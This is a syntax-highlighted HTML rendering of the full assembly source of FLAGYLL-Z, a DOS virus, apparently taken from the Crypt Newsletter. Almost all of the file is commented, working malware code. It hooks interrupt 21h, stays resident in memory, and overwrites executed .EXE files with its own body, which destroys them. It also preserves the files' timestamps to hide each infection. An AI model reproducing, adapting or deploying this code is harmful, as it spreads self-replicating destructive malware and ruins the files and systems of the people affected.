<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>FLAGYLLZ.ASM</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;FLAGYLL-Z virus - edited for Crypt Newsletter 13               </span><span class="sc0">
</span><span class="sc1">;FLAGYLL is a memory resident, overwriting virus which</span><span class="sc0">
</span><span class="sc1">;infects and destroys .EXE files on load.</span><span class="sc0">
</span><span class="sc1">;FLAGYLL-Z's infections are modulated by a routine which</span><span class="sc0">
</span><span class="sc1">;uses the system clock as a random trigger.  When .EXEfiles</span><span class="sc0">
</span><span class="sc1">;are loaded, FLAGYLL-Z will only infect if the current</span><span class="sc0">
</span><span class="sc1">;time - in seconds - is below 10.</span><span class="sc0">
</span><span class="sc1">;FLAGYLL-Z preserves the time-date stamps of infected files.</span><span class="sc0">
</span><span class="sc1">;.EXE's infected by FLAGYLL-Z are destroyed.  DOS will either</span><span class="sc0">
</span><span class="sc1">;refuse to load them or FLAGYLL-Z will become resident</span><span class="sc0">
</span><span class="sc1">;as they execute.  These programs are ruined and can only</span><span class="sc0">
</span><span class="sc1">;be deleted.</span><span class="sc0">
           
           
           </span><span class="sc9">.radix</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">
     </span><span class="sc5">cseg</span><span class="sc0">       </span><span class="sc9">segment</span><span class="sc0">
        </span><span class="sc5">model</span><span class="sc0">  </span><span class="sc10">small</span><span class="sc0">
        </span><span class="sc9">assume</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">cseg</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">cseg</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:</span><span class="sc5">cseg</span><span class="sc0">

        </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">

</span><span class="sc5">oi21</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">endflagyll</span><span class="sc0">             
</span><span class="sc5">filelength</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">endflagyll</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">begin</span><span class="sc0">     </span><span class="sc1">; virus length</span><span class="sc0">
</span><span class="sc5">nameptr</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">endflagyll</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">DTA</span><span class="sc0">             </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">endflagyll</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc0">
          
</span><span class="sc5">begin</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">install_flagyll</span><span class="sc0">                              
                         </span><span class="sc1">; install</span><span class="sc0">
</span><span class="sc5">install_flagyll</span><span class="sc4">:</span><span class="sc0">  
        
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">                    </span><span class="sc1">; reduce memory size     </span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                           
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                        
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0000</span><span class="sc4">],</span><span class="sc2">5a</span><span class="sc0">    </span><span class="sc1">; check if last memory     </span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">cancel</span><span class="sc0">                   </span><span class="sc1">; block     </span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0003</span><span class="sc4">]</span><span class="sc0">                 
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">100</span><span class="sc0">                   </span><span class="sc1">; decrease memory     </span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc2">0003</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">


</span><span class="sc5">copy_flagyll</span><span class="sc4">:</span><span class="sc0">  
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                    </span><span class="sc1">; copy to claimed block  </span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">                    </span><span class="sc1">; PSP    </span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                    </span><span class="sc1">; virus start in memory   </span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">endflagyll</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">begin</span><span class="sc0">  </span><span class="sc1">; cx = length of virus                  </span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc0">                    </span><span class="sc1">; restore ds   </span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">begin</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; point to start of virus</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:</span><span class="sc2">0100</span><span class="sc0">               </span><span class="sc1">; point to destination   </span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">                    </span><span class="sc1">; copy virus in memory   </span><span class="sc0">

</span><span class="sc5">hook_21</span><span class="sc4">:</span><span class="sc0">                                     
        
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                   </span><span class="sc1">; hook interrupt 21h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">0084h</span><span class="sc0">                </span><span class="sc1">; </span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">oi21</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">check_exec</span><span class="sc0">
        </span><span class="sc6">lodsw</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">cancel</span><span class="sc0">                  </span><span class="sc1">; exit, if already installed</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">movsw</span><span class="sc0">
        
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0"> 
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2521h</span><span class="sc0">               </span><span class="sc1">; revector int 21h to virus</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
                     
</span><span class="sc5">cancel</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">ret</span><span class="sc0">          

</span><span class="sc5">check_exec</span><span class="sc4">:</span><span class="sc0">                                    </span><span class="sc1">; look over loaded files</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">                          </span><span class="sc1">; for executables</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">                     </span><span class="sc1">; push everything onto the</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">                     </span><span class="sc1">; stack</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">04B00h</span><span class="sc0">               </span><span class="sc1">; is a file being </span><span class="sc0">
                        </span><span class="sc1">; executed ?</span><span class="sc0">
        
        
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">abort</span><span class="sc0">                   </span><span class="sc1">; no, exit</span><span class="sc0">

</span><span class="sc5">do_infect</span><span class="sc4">:</span><span class="sc0">      


        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">infect</span><span class="sc0">                </span><span class="sc1">; then try to infect</span><span class="sc0">

</span><span class="sc5">abort</span><span class="sc4">:</span><span class="sc0">                                        </span><span class="sc1">; restore everything</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">

</span><span class="sc5">exit</span><span class="sc4">:</span><span class="sc0">      
                         </span><span class="sc1">; exit</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">oi21</span><span class="sc4">]</span><span class="sc0">                     



</span><span class="sc5">infect</span><span class="sc4">:</span><span class="sc0">          
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">over_id</span><span class="sc0">               </span><span class="sc1">; it's a vanity thing</span><span class="sc0">

</span><span class="sc5">note</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'-=[Crypt Newsletter 13]=-'</span><span class="sc0">


</span><span class="sc5">over_id</span><span class="sc4">:</span><span class="sc0">        
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">name_seg</span><span class="sc4">],</span><span class="sc8">ds</span><span class="sc0">       </span><span class="sc1">; this routine</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">name_off</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">       </span><span class="sc1">; essentially grabs</span><span class="sc0">
                           </span><span class="sc1">; the name of the file</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">                                </span><span class="sc1">; clear direction flags</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">nameptr</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc1">; save pointer to the filename</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">nameptr</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ds</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2Fh</span><span class="sc0">                    </span><span class="sc1">; get old DTA</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">                        </span><span class="sc1">; set new DTA</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">DTA</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1Ah</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">searchpoint</span><span class="sc0">              </span><span class="sc1">; find filename for virus</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">COM_txt</span><span class="sc0">       </span><span class="sc1">; is extension 'COM' ?</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
     </span><span class="sc6">rep</span><span class="sc0">    </span><span class="sc6">cmpsb</span><span class="sc0"> 
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">return</span><span class="sc0">                  </span><span class="sc1">; if so, let it pass by</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">EXE_txt</span><span class="sc0">       </span><span class="sc1">; is extension .EXE ?</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">cmpsb</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">return</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2Ch</span><span class="sc0">               </span><span class="sc1">; DOS get system time.                      </span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                  </span><span class="sc1">; &lt;--alter values to suit        </span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">                </span><span class="sc1">; is seconds &gt; 10?</span><span class="sc0">
        </span><span class="sc6">jg</span><span class="sc0">      </span><span class="sc5">return</span><span class="sc0">               </span><span class="sc1">; if so, be quiet</span><span class="sc0">
                         </span><span class="sc1">; this slows down the  </span><span class="sc0">
                         </span><span class="sc1">; infection so computing is</span><span class="sc0">
                         </span><span class="sc1">; horribly disrupted when the</span><span class="sc0">
</span><span class="sc5">do_exe</span><span class="sc4">:</span><span class="sc0">                                      </span><span class="sc1">; virus is in memory</span><span class="sc0">
        
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4300h</span><span class="sc0">             </span><span class="sc1">; clear attributes</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">name_seg</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">name_off</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">0feh</span><span class="sc0">                
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">               
        
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">name_seg</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; open file read/write</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">name_off</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3D02h</span><span class="sc0">             
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">            
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">close_file</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">handle</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">          
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">               

</span><span class="sc5">get_date</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5700h</span><span class="sc0">        
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">       
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">date</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">      
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">time</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">
        
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">          </span><span class="sc1">; move pointer to beginning of file</span><span class="sc0">
        
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc5">handle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
        
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40</span><span class="sc0">             </span><span class="sc1">; write to file</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">filelength</span><span class="sc0">     </span><span class="sc1">; length of Flagyll in CX </span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">100</span><span class="sc0">            </span><span class="sc1">; start at beginning of Flagyll</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">               </span><span class="sc1">; write Flagyll to file</span><span class="sc0">
        
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">restore_date</span><span class="sc0">

</span><span class="sc5">close_file</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc5">handle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">03Eh</span><span class="sc0">           </span><span class="sc1">; close file         </span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
        
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4C00h</span><span class="sc0">          </span><span class="sc1">; exit to DOS</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc5">return</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1Ah</span><span class="sc0">                 
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">                </span><span class="sc1">; restore old DTA</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21H</span><span class="sc0">

        </span><span class="sc6">ret</span><span class="sc0">                            


</span><span class="sc5">searchpoint</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">les</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">nameptr</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">0FFh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
     </span><span class="sc6">repnz</span><span class="sc0">  </span><span class="sc6">scasb</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">restore_date</span><span class="sc4">:</span><span class="sc0">      
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">                       
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc5">handle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc5">date</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,[</span><span class="sc5">time</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5701h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">


        

</span><span class="sc5">EXE_txt</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'EXE'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">      </span><span class="sc1">; extension masks</span><span class="sc0">
</span><span class="sc5">COM_txt</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'COM'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">      </span><span class="sc1">; for host selection</span><span class="sc0">

</span><span class="sc5">name_seg</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">            </span><span class="sc1">; data buffers for virus action</span><span class="sc0">
</span><span class="sc5">name_off</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">            </span><span class="sc1">; on the fly</span><span class="sc0">
</span><span class="sc5">handle</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">time</span><span class="sc0">            </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">date</span><span class="sc0">            </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">note2</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc12">'Flagyll-Z'</span><span class="sc0"> </span><span class="sc1">; virus name</span><span class="sc0">

</span><span class="sc5">endflagyll</span><span class="sc4">:</span><span class="sc0">


</span><span class="sc5">cseg</span><span class="sc0">            </span><span class="sc9">ends</span><span class="sc0">
        </span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">begin</span><span class="sc0">



</span></div></body>
</html>
